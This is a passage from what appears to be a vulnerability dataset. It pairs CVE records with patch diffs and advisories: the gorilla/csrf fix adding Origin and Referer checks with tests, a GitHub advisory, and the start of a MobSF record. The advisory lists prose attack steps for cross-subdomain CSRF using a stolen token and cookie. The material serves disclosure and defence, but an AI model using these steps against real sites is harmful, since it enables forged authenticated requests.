ErrBadOrigin is returned when the Origin header is present and is not a\n+\t// trusted origin.\n+\tErrBadOrigin = errors.New(\"origin invalid\")\n \t// ErrBadReferer is returned when the scheme & host in the URL do not match\n \t// the supplied Referer header.\n \tErrBadReferer = errors.New(\"referer invalid\")\n\n@@ -242,10 +255,50 @@\nfunc (cs *csrf) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n \t// HTTP methods not defined as idempotent (\"safe\") under RFC7231 require\n \t// inspection.\n \tif !contains(safeMethods, r.Method) {\n-\t\t// Enforce an origin check for HTTPS connections. As per the Django CSRF\n-\t\t// implementation (https://goo.gl/vKA7GE) the Referer header is almost\n-\t\t// always present for same-domain HTTP requests.\n-\t\tif r.URL.Scheme == \"https\" {\n+\t\tvar isPlaintext bool\n+\t\tval := r.Context().Value(PlaintextHTTPContextKey)\n+\t\tif val != nil {\n+\t\t\tisPlaintext, _ = val.(bool)\n+\t\t}\n+\n+\t\t// take a copy of the request URL to avoid mutating the original\n+\t\t// attached to the request.\n+\t\t// set the scheme & host based on the request context as these are not\n+\t\t// populated by default for server requests\n+\t\t// ref: https://pkg.go.dev/net/http#Request\n+\t\trequestURL := *r.URL // shallow clone\n+\n+\t\trequestURL.Scheme = \"https\"\n+\t\tif isPlaintext {\n+\t\t\trequestURL.Scheme = \"http\"\n+\t\t}\n+\t\tif requestURL.Host == \"\" {\n+\t\t\trequestURL.Host = r.Host\n+\t\t}\n+\n+\t\t// if we have an Origin header, check it against our allowlist\n+\t\torigin := r.Header.Get(\"Origin\")\n+\t\tif origin != \"\" {\n+\t\t\tparsedOrigin, err := url.Parse(origin)\n+\t\t\tif err != nil {\n+\t\t\t\tr = envError(r, ErrBadOrigin)\n+\t\t\t\tcs.opts.ErrorHandler.ServeHTTP(w, r)\n+\t\t\t\treturn\n+\t\t\t}\n+\t\t\tif !sameOrigin(&requestURL, parsedOrigin) && !slices.Contains(cs.opts.TrustedOrigins, parsedOrigin.Host) {\n+\t\t\t\tr = envError(r, ErrBadOrigin)\n+\t\t\t\tcs.opts.ErrorHandler.ServeHTTP(w, r)\n+\t\t\t\treturn\n+\t\t\t}\n+\t\t}\n+\n+\t\t// If we are serving via TLS and have no Origin header, prevent against\n+\t\t// CSRF via HTTP machine in the middle attacks by enforcing strict\n+\t\t// Referer origin checks. Consider an attacker who performs a\n+\t\t// successful HTTP Machine-in-the-Middle attack and uses this to inject\n+\t\t// a form and cause submission to our origin. We strictly disallow\n+\t\t// cleartext HTTP origins and evaluate the domain against an allowlist.\n+\t\tif origin == \"\" && !isPlaintext {\n \t\t\t// Fetch the Referer value. Call the error handler if it's empty or\n \t\t\t// otherwise fails to parse.\n \t\t\treferer, err := url.Parse(r.Referer())\n\n@@ -255,18 +308,17 @@\nfunc (cs *csrf) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n \t\t\t\treturn\n \t\t\t}\n \n-\t\t\tvalid := sameOrigin(r.URL, referer)\n-\n-\t\t\tif !valid {\n-\t\t\t\tfor _, trustedOrigin := range cs.opts.TrustedOrigins {\n-\t\t\t\t\tif referer.Host == trustedOrigin {\n-\t\t\t\t\t\tvalid = true\n-\t\t\t\t\t\tbreak\n-\t\t\t\t\t}\n-\t\t\t\t}\n+\t\t\t// disallow cleartext HTTP referers when serving via TLS\n+\t\t\tif referer.Scheme == \"http\" {\n+\t\t\t\tr = envError(r, ErrBadReferer)\n+\t\t\t\tcs.opts.ErrorHandler.ServeHTTP(w, r)\n+\t\t\t\treturn\n \t\t\t}\n \n-\t\t\tif !valid {\n+\t\t\t// If the request is being served via TLS and the Referer is not the\n+\t\t\t// same origin, check the domain against our allowlist. We only\n+\t\t\t// check when we have host information from the referer.\n+\t\t\tif referer.Host != \"\" && referer.Host != r.Host && !slices.Contains(cs.opts.TrustedOrigins, referer.Host) {\n \t\t\t\tr = envError(r, ErrBadReferer)\n \t\t\t\tcs.opts.ErrorHandler.ServeHTTP(w, r)\n \t\t\t\treturn\n\n@@ -308,6 +360,15 @@\nfunc (cs *csrf) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n \tcontextClear(r)\n }\n \n+// PlaintextHTTPRequest accepts as input a http.Request and returns a new\n+// http.Request with the PlaintextHTTPContextKey set to true. This is used to\n+// signal to the CSRF middleware that the request is being served over plaintext\n+// HTTP and that Referer-based origin allow-listing checks should be skipped.\n+func PlaintextHTTPRequest(r *http.Request) *http.Request {\n+\tctx := context.WithValue(r.Context(), PlaintextHTTPContextKey, true)\n+\treturn r.WithContext(ctx)\n+}\n+\n // unauthorizedhandler sets a HTTP 403 Forbidden status and writes the\n // CSRF failure reason to the response.\n func unauthorizedHandler(w http.ResponseWriter, r *http.Request) {\n```\n\nFilename: csrf_test.go:\n```\n@@ -1,6 +1,7 @@\npackage csrf\n \n import (\n+\t\"fmt\"\n \t\"net/http\"\n \t\"net/http/httptest\"\n \t\"strings\"\n\n@@ -16,10 +17,7 @@\nfunc TestProtect(t *testing.T) {\n \ts := http.NewServeMux()\n \ts.HandleFunc(\"/\", testHandler)\n \n-\tr, err := http.NewRequest(\"GET\", \"/\", nil)\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n+\tr := createRequest(\"GET\", \"/\", false)\n \n \trr := httptest.NewRecorder()\n \tp := Protect(testKey)(s)\n\n@@ -46,10 +44,7 @@\nfunc TestCookieOptions(t *testing.T) {\n \ts := http.NewServeMux()\n \ts.HandleFunc(\"/\", testHandler)\n \n-\tr, err := http.NewRequest(\"GET\", \"/\", nil)\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n+\tr := createRequest(\"GET\", \"/\", false)\n \n \trr := httptest.NewRecorder()\n \tp := Protect(testKey, CookieName(\"nameoverride\"), Secure(false), HttpOnly(false), Path(\"/pathoverride\"), Domain(\"domainoverride\"), MaxAge(173))(s)\n\n@@ -86,10 +81,7 @@\nfunc TestMethods(t *testing.T) {\n \n \t// Test idempontent (\"safe\") methods\n \tfor _, method := range safeMethods {\n-\t\tr, err := http.NewRequest(method, \"/\", nil)\n-\t\tif err != nil {\n-\t\t\tt.Fatal(err)\n-\t\t}\n+\t\tr := createRequest(method, \"/\", false)\n \n \t\trr := httptest.NewRecorder()\n \t\tp.ServeHTTP(rr, r)\n\n@@ -107,10 +99,7 @@\nfunc TestMethods(t *testing.T) {\n \t// Test non-idempotent methods (should return a 403 without a cookie set)\n \tnonIdempotent := []string{\"POST\", \"PUT\", \"DELETE\", \"PATCH\"}\n \tfor _, method := range nonIdempotent {\n-\t\tr, err := http.NewRequest(method, \"/\", nil)\n-\t\tif err != nil {\n-\t\t\tt.Fatal(err)\n-\t\t}\n+\t\tr := createRequest(method, \"/\", false)\n \n \t\trr := httptest.NewRecorder()\n \t\tp.ServeHTTP(rr, r)\n\n@@ -133,10 +122,7 @@\nfunc TestNoCookie(t *testing.T) {\n \tp := Protect(testKey)(s)\n \n \t// POST the token back in the header.\n-\tr, err := http.NewRequest(\"POST\", \"http://www.gorillatoolkit.org/\", nil)\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n+\tr := createRequest(\"POST\", \"/\", false)\n \n \trr := httptest.NewRecorder()\n \tp.ServeHTTP(rr, r)\n\n@@ -158,19 +144,13 @@\nfunc TestBadCookie(t *testing.T) {\n \t}))\n \n \t// Obtain a CSRF cookie via a GET request.\n-\tr, err := http.NewRequest(\"GET\", \"http://www.gorillatoolkit.org/\", nil)\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n+\tr := createRequest(\"GET\", \"/\", false)\n \n \trr := httptest.NewRecorder()\n \tp.ServeHTTP(rr, r)\n \n \t// POST the token back in the header.\n-\tr, err = http.NewRequest(\"POST\", \"http://www.gorillatoolkit.org/\", nil)\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n+\tr = createRequest(\"POST\", \"/\", false)\n \n \t// Replace the cookie prefix\n \tbadHeader := strings.Replace(cookieName+\"=\", rr.Header().Get(\"Set-Cookie\"), \"_badCookie\", -1)\n\n@@ -193,10 +173,7 @@\nfunc TestVaryHeader(t *testing.T) {\n \ts.HandleFunc(\"/\", testHandler)\n \tp := Protect(testKey)(s)\n \n-\tr, err := http.NewRequest(\"HEAD\", \"https://www.golang.org/\", nil)\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n+\tr := createRequest(\"GET\", \"/\", true)\n \n \trr := httptest.NewRecorder()\n \tp.ServeHTTP(rr, r)\n\n@@ -211,16 +188,13 @@\nfunc TestVaryHeader(t *testing.T) {\n \t}\n }\n \n-// Requests with no Referer header should fail.\n+// TestNoReferer checks that HTTPS requests with no Referer header fail.\n func TestNoReferer(t *testing.T) {\n \ts := http.NewServeMux()\n \ts.HandleFunc(\"/\", testHandler)\n \tp := Protect(testKey)(s)\n \n-\tr, err := http.NewRequest(\"POST\", \"https://golang.org/\", nil)\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n+\tr := createRequest(\"POST\", \"https://golang.org/\", true)\n \n \trr := httptest.NewRecorder()\n \tp.ServeHTTP(rr, r)\n\n@@ -243,20 +217,12 @@\nfunc TestBadReferer(t *testing.T) {\n \t}))\n \n \t// Obtain a CSRF cookie via a GET request.\n-\tr, err := http.NewRequest(\"GET\", \"https://www.gorillatoolkit.org/\", nil)\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n-\n+\tr := createRequest(\"GET\", \"/\", true)\n \trr := httptest.NewRecorder()\n \tp.ServeHTTP(rr, r)\n \n \t// POST the token back in the header.\n-\tr, err = http.NewRequest(\"POST\", \"https://www.gorillatoolkit.org/\", nil)\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n-\n+\tr = createRequest(\"POST\", \"/\", true)\n \tsetCookie(rr, r)\n \tr.Header.Set(\"X-CSRF-Token\", token)\n\n@@ -289,50 +255,47 @@\nfunc TestTrustedReferer(t *testing.T) {\n \t}\n \n \tfor _, item := range testTable {\n-\t\ts := http.NewServeMux()\n+\t\tt.Run(fmt.Sprintf(\"TrustedOrigin: %v\", item.trustedOrigin), func(t *testing.T) {\n \n-\t\tp := Protect(testKey, TrustedOrigins(item.trustedOrigin))(s)\n+\t\t\ts := http.NewServeMux()\n \n-\t\tvar token string\n-\t\ts.Handle(\"/\", http.HandlerFunc(func(_ http.ResponseWriter, r *http.Request) {\n-\t\t\ttoken = Token(r)\n-\t\t}))\n+\t\t\tp := Protect(testKey, TrustedOrigins(item.trustedOrigin))(s)\n \n-\t\t// Obtain a CSRF cookie via a GET request.\n-\t\tr, err := http.NewRequest(\"GET\", \"https://www.gorillatoolkit.org/\", nil)\n-\t\tif err != nil {\n-\t\t\tt.Fatal(err)\n-\t\t}\n+\t\t\tvar token string\n+\t\t\ts.Handle(\"/\", http.HandlerFunc(func(_ http.ResponseWriter, r *http.Request) {\n+\t\t\t\ttoken = Token(r)\n+\t\t\t}))\n \n-\t\trr := httptest.NewRecorder()\n-\t\tp.ServeHTTP(rr, r)\n+\t\t\t// Obtain a CSRF cookie via a GET request.\n+\t\t\tr := createRequest(\"GET\", \"/\", true)\n \n-\t\t// POST the token back in the header.\n-\t\tr, err = http.NewRequest(\"POST\", \"https://www.gorillatoolkit.org/\", nil)\n-\t\tif err != nil {\n-\t\t\tt.Fatal(err)\n-\t\t}\n+\t\t\trr := httptest.NewRecorder()\n+\t\t\tp.ServeHTTP(rr, r)\n \n-\t\tsetCookie(rr, r)\n-\t\tr.Header.Set(\"X-CSRF-Token\", token)\n+\t\t\t// POST the token back in the header.\n+\t\t\tr = createRequest(\"POST\", \"/\", true)\n \n-\t\t// Set a non-matching Referer header.\n-\t\tr.Header.Set(\"Referer\", \"http://golang.org/\")\n+\t\t\tsetCookie(rr, r)\n+\t\t\tr.Header.Set(\"X-CSRF-Token\", token)\n \n-\t\trr = httptest.NewRecorder()\n-\t\tp.ServeHTTP(rr, r)\n+\t\t\t// Set a non-matching Referer header.\n+\t\t\tr.Header.Set(\"Referer\", \"https://golang.org/\")\n \n-\t\tif item.shouldPass {\n-\t\t\tif rr.Code != http.StatusOK {\n-\t\t\t\tt.Fatalf(\"middleware failed to pass to the next handler: got %v want %v\",\n-\t\t\t\t\trr.Code, http.StatusOK)\n-\t\t\t}\n-\t\t} else {\n-\t\t\tif rr.Code != http.StatusForbidden {\n-\t\t\t\tt.Fatalf(\"middleware failed reject a non-matching Referer header: got %v want %v\",\n-\t\t\t\t\trr.Code, http.StatusForbidden)\n+\t\t\trr = httptest.NewRecorder()\n+\t\t\tp.ServeHTTP(rr, r)\n+\n+\t\t\tif item.shouldPass {\n+\t\t\t\tif rr.Code != http.StatusOK {\n+\t\t\t\t\tt.Fatalf(\"middleware failed to pass to the next handler: got %v want %v\",\n+\t\t\t\t\t\trr.Code, http.StatusOK)\n+\t\t\t\t}\n+\t\t\t} else {\n+\t\t\t\tif rr.Code != http.StatusForbidden {\n+\t\t\t\t\tt.Fatalf(\"middleware failed reject a non-matching Referer header: got %v want %v\",\n+\t\t\t\t\t\trr.Code, http.StatusForbidden)\n+\t\t\t\t}\n \t\t\t}\n-\t\t}\n+\t\t})\n \t}\n }\n\n@@ -347,23 +310,16 @@\nfunc TestWithReferer(t *testing.T) {\n \t}))\n \n \t// Obtain a CSRF cookie via a GET request.\n-\tr, err := http.NewRequest(\"GET\", \"http://www.gorillatoolkit.org/\", nil)\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n-\n+\tr := createRequest(\"GET\", \"/\", true)\n \trr := httptest.NewRecorder()\n \tp.ServeHTTP(rr, r)\n \n \t// POST the token back in the header.\n-\tr, err = http.NewRequest(\"POST\", \"http://www.gorillatoolkit.org/\", nil)\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n+\tr = createRequest(\"POST\", \"/\", true)\n \n \tsetCookie(rr, r)\n \tr.Header.Set(\"X-CSRF-Token\", token)\n-\tr.Header.Set(\"Referer\", \"http://www.gorillatoolkit.org/\")\n+\tr.Header.Set(\"Referer\", \"https://www.gorillatoolkit.org/\")\n \n \trr = httptest.NewRecorder()\n \tp.ServeHTTP(rr, r)\n\n@@ -387,26 +343,19 @@\nfunc TestNoTokenProvided(t *testing.T) {\n \ts.Handle(\"/\", http.HandlerFunc(func(_ http.ResponseWriter, r *http.Request) {\n \t\ttoken = Token(r)\n \t}))\n-\n \t// Obtain a CSRF cookie via a GET request.\n-\tr, err := http.NewRequest(\"GET\", \"http://www.gorillatoolkit.org/\", nil)\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n+\tr := createRequest(\"GET\", \"/\", true)\n \n \trr := httptest.NewRecorder()\n \tp.ServeHTTP(rr, r)\n \n \t// POST the token back in the header.\n-\tr, err = http.NewRequest(\"POST\", \"http://www.gorillatoolkit.org/\", nil)\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n+\tr = createRequest(\"POST\", \"/\", true)\n \n \tsetCookie(rr, r)\n \t// By accident we use the wrong header name for the token...\n \tr.Header.Set(\"X-CSRF-nekot\", token)\n-\tr.Header.Set(\"Referer\", \"http://www.gorillatoolkit.org/\")\n+\tr.Header.Set(\"Referer\", \"https://www.gorillatoolkit.org/\")\n \n \trr = httptest.NewRecorder()\n \tp.ServeHTTP(rr, r)\n\n@@ -419,3 +368,177 @@\nfunc TestNoTokenProvided(t *testing.T) {\n func setCookie(rr *httptest.ResponseRecorder, r *http.Request) {\n \tr.Header.Set(\"Cookie\", rr.Header().Get(\"Set-Cookie\"))\n }\n+\n+func TestProtectScenarios(t *testing.T) {\n+\ttests := []struct {\n+\t\tname                 string\n+\t\tsafeMethod           bool\n+\t\toriginUntrusted      bool\n+\t\toriginHTTP           bool\n+\t\toriginTrusted        bool\n+\t\tsecureRequest        bool\n+\t\trefererTrusted       bool\n+\t\trefererUntrusted     bool\n+\t\trefererHTTPDowngrade bool\n+\t\trefererRelative      bool\n+\t\ttokenValid           bool\n+\t\ttokenInvalid         bool\n+\t\twant                 bool\n+\t}{\n+\t\t{\n+\t\t\tname:       \"safe method pass\",\n+\t\t\tsafeMethod: true,\n+\t\t\twant:       true,\n+\t\t},\n+\t\t{\n+\t\t\tname:       \"cleartext POST with trusted origin & valid token pass\",\n+\t\t\toriginHTTP: true,\n+\t\t\ttokenValid: true,\n+\t\t\twant:       true,\n+\t\t},\n+\t\t{\n+\t\t\tname:            \"cleartext POST with untrusted origin reject\",\n+\t\t\toriginUntrusted: true,\n+\t\t\ttokenValid:      true,\n+\t\t},\n+\t\t{\n+\t\t\tname:       \"cleartext POST with HTTP origin & invalid token reject\",\n+\t\t\toriginHTTP: true,\n+\t\t},\n+\t\t{\n+\t\t\tname:       \"cleartext POST without origin with valid token pass\",\n+\t\t\ttokenValid: true,\n+\t\t\twant:       true,\n+\t\t},\n+\t\t{\n+\t\t\tname: \"cleartext POST without origin with invalid token reject\",\n+\t\t},\n+\t\t{\n+\t\t\tname:          \"TLS POST with HTTP origin & no referer & valid token reject\",\n+\t\t\ttokenValid:    true,\n+\t\t\tsecureRequest: true,\n+\t\t\toriginHTTP:    true,\n+\t\t},\n+\t\t{\n+\t\t\tname:          \"TLS POST without origin and without referer reject\",\n+\t\t\tsecureRequest: true,\n+\t\t\ttokenValid:    true,\n+\t\t},\n+\t\t{\n+\t\t\tname:             \"TLS POST without origin with untrusted referer reject\",\n+\t\t\tsecureRequest:    true,\n+\t\t\trefererUntrusted: true,\n+\t\t\ttokenValid:       true,\n+\t\t},\n+\t\t{\n+\t\t\tname:           \"TLS POST without origin with trusted referer & valid token pass\",\n+\t\t\tsecureRequest:  true,\n+\t\t\trefererTrusted: true,\n+\t\t\ttokenValid:     true,\n+\t\t\twant:           true,\n+\t\t},\n+\t\t{\n+\t\t\tname:                 \"TLS POST without origin from _cleartext_ same domain referer with valid token reject\",\n+\t\t\tsecureRequest:        true,\n+\t\t\trefererHTTPDowngrade: true,\n+\t\t\ttokenValid:           true,\n+\t\t},\n+\t\t{\n+\t\t\tname:            \"TLS POST without origin from relative referer with valid token pass\",\n+\t\t\tsecureRequest:   true,\n+\t\t\trefererRelative: true,\n+\t\t\ttokenValid:      true,\n+\t\t\twant:            true,\n+\t\t},\n+\t\t{\n+\t\t\tname:            \"TLS POST without origin from relative referer with invalid token reject\",\n+\t\t\tsecureRequest:   true,\n+\t\t\trefererRelative: true,\n+\t\t\ttokenInvalid:    true,\n+\t\t},\n+\t}\n+\n+\tfor _, tt := range tests {\n+\t\tt.Run(tt.name, func(t *testing.T) {\n+\t\t\tvar token string\n+\t\t\tvar flag bool\n+\t\t\tmux := http.NewServeMux()\n+\t\t\tmux.Handle(\"/\", http.HandlerFunc(func(_ http.ResponseWriter, r *http.Request) {\n+\t\t\t\ttoken = Token(r)\n+\t\t\t}))\n+\t\t\tmux.Handle(\"/submit\", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n+\t\t\t\tflag = true\n+\t\t\t}))\n+\t\t\tp := Protect(testKey)(mux)\n+\n+\t\t\t// Obtain a CSRF cookie via a GET request.\n+\t\t\tr := createRequest(\"GET\", \"/\", tt.secureRequest)\n+\t\t\trr := httptest.NewRecorder()\n+\t\t\tp.ServeHTTP(rr, r)\n+\n+\t\t\tr = createRequest(\"POST\", \"/submit\", tt.secureRequest)\n+\t\t\tif tt.safeMethod {\n+\t\t\t\tr = createRequest(\"GET\", \"/submit\", tt.secureRequest)\n+\t\t\t}\n+\n+\t\t\t// Set the Origin header\n+\t\t\tswitch {\n+\t\t\tcase tt.originUntrusted:\n+\t\t\t\tr.Header.Set(\"Origin\", \"http://www.untrusted-origin.org\")\n+\t\t\tcase tt.originTrusted:\n+\t\t\t\tr.Header.Set(\"Origin\", \"https://www.gorillatoolkit.org\")\n+\t\t\tcase tt.originHTTP:\n+\t\t\t\tr.Header.Set(\"Origin\", \"http://www.gorillatoolkit.org\")\n+\t\t\t}\n+\n+\t\t\t// Set the Referer header\n+\t\t\tswitch {\n+\t\t\tcase tt.refererTrusted:\n+\t\t\t\tp = Protect(testKey, TrustedOrigins([]string{\"external-trusted-origin.test\"}))(mux)\n+\t\t\t\tr.Header.Set(\"Referer\", \"https://external-trusted-origin.test/foobar\")\n+\t\t\tcase tt.refererUntrusted:\n+\t\t\t\tr.Header.Set(\"Referer\", \"http://www.invalid-referer.org\")\n+\t\t\tcase tt.refererHTTPDowngrade:\n+\t\t\t\tr.Header.Set(\"Referer\", \"http://www.gorillatoolkit.org/foobar\")\n+\t\t\tcase tt.refererRelative:\n+\t\t\t\tr.Header.Set(\"Referer\", \"/foobar\")\n+\t\t\t}\n+\n+\t\t\t// Set the CSRF token & associated cookie\n+\t\t\tswitch {\n+\t\t\tcase tt.tokenInvalid:\n+\t\t\t\tsetCookie(rr, r)\n+\t\t\t\tr.Header.Set(\"X-CSRF-Token\", \"this-is-an-invalid-token\")\n+\t\t\tcase tt.tokenValid:\n+\t\t\t\tsetCookie(rr, r)\n+\t\t\t\tr.Header.Set(\"X-CSRF-Token\", token)\n+\t\t\t}\n+\n+\t\t\trr = httptest.NewRecorder()\n+\t\t\tp.ServeHTTP(rr, r)\n+\n+\t\t\tif tt.want && rr.Code != http.StatusOK {\n+\t\t\t\tt.Fatalf(\"middleware failed to pass to the next handler: got %v want %v\",\n+\t\t\t\t\trr.Code, http.StatusOK)\n+\t\t\t}\n+\n+\t\t\tif tt.want && !flag {\n+\t\t\t\tt.Fatalf(\"middleware failed to pass to the next handler: got %v want %v\",\n+\t\t\t\t\tflag, true)\n+\n+\t\t\t}\n+\t\t\tif !tt.want && flag {\n+\t\t\t\tt.Fatalf(\"middleware failed to reject the request: got %v want %v\", flag, false)\n+\t\t\t}\n+\t\t})\n+\t}\n+}\n+\n+func createRequest(method, path string, useTLS bool) *http.Request {\n+\tr := httptest.NewRequest(method, path, nil)\n+\tr.Host = \"www.gorillatoolkit.org\"\n+\tif !useTLS {\n+\t\treturn PlaintextHTTPRequest(r)\n+\t}\n+\treturn r\n+}\n```\n\nFilename: helpers_test.go:\n```\n@@ -83,10 +83,7 @@\nfunc TestMultipartFormToken(t *testing.T) {\n \t\t}\n \t}))\n \n-\tr, err := http.NewRequest(\"GET\", \"/\", nil)\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n+\tr := createRequest(\"GET\", \"/\", true)\n \n \trr := httptest.NewRecorder()\n \tp := Protect(testKey)(s)\n\n@@ -107,13 +104,13 @@\nfunc TestMultipartFormToken(t *testing.T) {\n \n \tmp.Close()\n \n-\tr, err = http.NewRequest(\"POST\", \"http://www.gorillatoolkit.org/\", &b)\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n+\tr = httptest.NewRequest(\"POST\", \"/\", &b)\n+\tr.Host = \"www.gorillatoolkit.org\"\n \n \t// Add the multipart header.\n \tr.Header.Set(\"Content-Type\", mp.FormDataContentType())\n+\t// Add Origin to pass the same-origin check.\n+\tr.Header.Set(\"Origin\", \"https://www.gorillatoolkit.org\")\n \n \t// Send back the issued cookie.\n \tsetCookie(rr, r)\n\n@@ -246,10 +243,8 @@\nfunc TestTemplateField(t *testing.T) {\n \t}))\n \n \ttestFieldName := \"custom_field_name\"\n-\tr, err := http.NewRequest(\"GET\", \"/\", nil)\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n+\tr := createRequest(\"GET\", \"/\", false)\n+\t// r, err := http.NewRequest(\"GET\", \"/\", nil)\n \n \trr := httptest.NewRecorder()\n \tp := Protect(testKey, FieldName(testFieldName))(s)\n\n@@ -299,10 +294,7 @@\nfunc TestUnsafeSkipCSRFCheck(t *testing.T) {\n \t\tw.WriteHeader(teapot)\n \t}))\n \n-\tr, err := http.NewRequest(\"POST\", \"/\", nil)\n-\tif err != nil {\n-\t\tt.Fatal(err)\n-\t}\n+\tr := createRequest(\"POST\", \"/\", false)\n \n \t// Must be used prior to the CSRF handler being invoked.\n \tp := skipCheck(Protect(testKey)(s))\n```",
                "url": "https://github.com/gorilla/csrf/commit/9dd6af1f6d30fc79fb0d972394deebdabad6b5eb"
            }
        ],
        "published_date": "2025-04-15T18:57:40.559Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\ngorilla\n/\ncsrf\nPublic\nNotifications You must be signed in to change notification settings\nFork 159\nStar 1.1k\nCode\nIssues\n15\nPull requests\n4\nActions\nProjects\n1\nSecurity\n1\nInsights\nAdditional navigation options\nCSRF vulnerability due to broken Referer validation\nHigh apoorvajagtap published GHSA-rq77-p4h8-4crw on Apr 13Apr 14, 2025\nPackage\ngomod github.com/gorilla/csrf\n(\nGo\n)\nAffected versions\n< 1.7.2\nPatched versions\nNone\nDescription\nSummary\ngorilla/csrf is vulnerable to CSRF via form submission from origins that share a top level domain with the target origin.\nDetails\ngorilla/csrf does not validate the Origin header against an allowlist. Its executes its validation of the Referer header for cross-origin requests only when it believes the request is being served over TLS. It determines this by inspecting the r.URL.Scheme value. However, this value is never populated for \"server\" requests per the Go spec, and so this check does not run in practice.\n // URL specifies either the URI being requested (for server\n // requests) or the URL to access (for client requests).\n //\n // For server requests, the URL is parsed from the URI\n // supplied on the Request-Line as stored in RequestURI.  For\n // most requests, fields other than Path and RawQuery will be\n // empty. (See [RFC 7230, Section 5.3](https://rfc-editor.org/rfc/rfc7230.html#section-5.3))\n //\n // For client requests, the URL's Host specifies the server to\n // connect to, while the Request's Host field optionally\n // specifies the Host header value to send in the HTTP\n // request.\n URL *[url](https://pkg.go.dev/net/url).[URL](https://pkg.go.dev/net/url#URL)\nPoC\nA private repository with a full PoC of all of these steps exists on Github. Please reach out to @patrickod for invite\ncreate trusted origin target.example.test protected with gorilla/csrf and served over TLS hosting form on /submit\ncreate attacker origin attack.example.test served over TLS\nattacker exfiltrates token & cookie combination from target.example.test\nattacker sets exfiltrated cookie with domain=.example.test and path=/submit\nas the cookie has a more specific path than / (the default for CSRF cookies) it will be sent first by the browser on submit to our target origin\nsubmit form from attack.example.test with exfiltrated CSRF form token\nobserve valid form submission as attack.example.test Origin / Referer headers are not validated.\nImpact\nThis vulnerability allows an attacker who has gained XSS on a subdomain or top level domain to perform authenticated form submissions against gorilla/csrf protected targets that share the same top level domain.\nThis bug has existed in gorilla/csrf since its initial release in 2015.\nDisclosure\nI ask that you please coordinate the public disclosure of this vulnerability with me.\nSeverity\nHigh\nCVE ID\nCVE-2025-24358\nWeaknesses\nNo CWEs\nCredits\npatrickod\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory mentions the existence of a private repository containing a proof of concept, but it does not include the proof of concept directly in the advisory, only a summary of its existence and key steps.",
                "url": "https://github.com/gorilla/csrf/security/advisories/GHSA-rq77-p4h8-4crw"
            }
        ],
        "sw_version": "v1.7.2",
        "sw_version_wget": "https://github.com/gorilla/csrf/archive/refs/tags/v1.7.2.zip"
    },
    "CVE-2025-24805": {
        "cwe": [
            {
                "id": "CWE-269",
                "value": "CWE-269: Improper Privilege Management"
            }
        ],
        "description": "Mobile Security Framework (MobSF) is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware analysis and security assessment framework. A local user with minimal privileges is able to make use of an access token for materials for scopes which it should not be accepted. This issue has been addressed in version 4.3.1 and all users are advised to upgrade. There are no known workarounds for this vulnerability.",
        "languages": [
            "JavaScript",
            "Python"
        ],
        "patch_commits": [
            {
                "content": "[SECURITY] Security update to fix vulnerabilities reported by Positive Technologies researchers (#2488)\n\n* Fix Stored XSS in iOS Dynamic Analysis, GHSA-cxqq-w3x5-7ph3\r\n* Fix DOS by loose re_path check and strict check inside function, GHSA-jrm8-xgf3-fwqr\r\n* Fix API Key leakage, replace REST API with authenticated endpoint, GHSA-79f6-p65j-3m2m\r\n* Update SECURITY.md\n\nFilename: .github/SECURITY.md:\n```\n@@ -10,6 +10,9 @@\nPlease report all security issues [here](https://github.com/MobSF/Mobile-Securit\n \n | Vulnerability | Affected Versions |\n | ------- | ------------------ |\n+| [Partial Denial of Service due to strict regex check in iOS report view URL](https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-jrm8-xgf3-fwqr) | `<=4.3.0` |\n+| [Local Privilege escalation due to leaked REST API key in web UI](https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-79f6-p65j-3m2m) | `<=4.3.0` |\n+| [Stored Cross-Site Scripting in iOS dynamic_analysis view via `bundle` id](https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-cxqq-w3x5-7ph3) | `<=4.3.0` |\n | [Stored Cross-Site Scripting Vulnerability in Recent Scans \"Diff or Compare\"](https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-5jc6-h9w7-jm3p) | `<=4.2.8` |\n | [Zip Slip Vulnerability in .a extraction](https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-4hh3-vj32-gr6j) | `<=4.0.6` |\n | [Open Redirect in Login redirect](https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-8m9j-2f32-2vx4) | `<=4.0.4` |\n```\n\nFilename: mobsf/DynamicAnalyzer/views/ios/corellium_instance.py:\n```\n@@ -763,6 +763,8 @@\ndef download_data(request, bundle_id, api=False):\n         if failed:\n             return send_response(failed, api)\n         if not strict_package_check(bundle_id):\n+            # Check bundle_id during call, as the check\n+            # is not done in REST API/URL repath.\n             data['message'] = 'Invalid iOS Bundle id'\n             return send_response(data, api)\n         ci = CorelliumInstanceAPI(instance_id)\n```\n\nFilename: 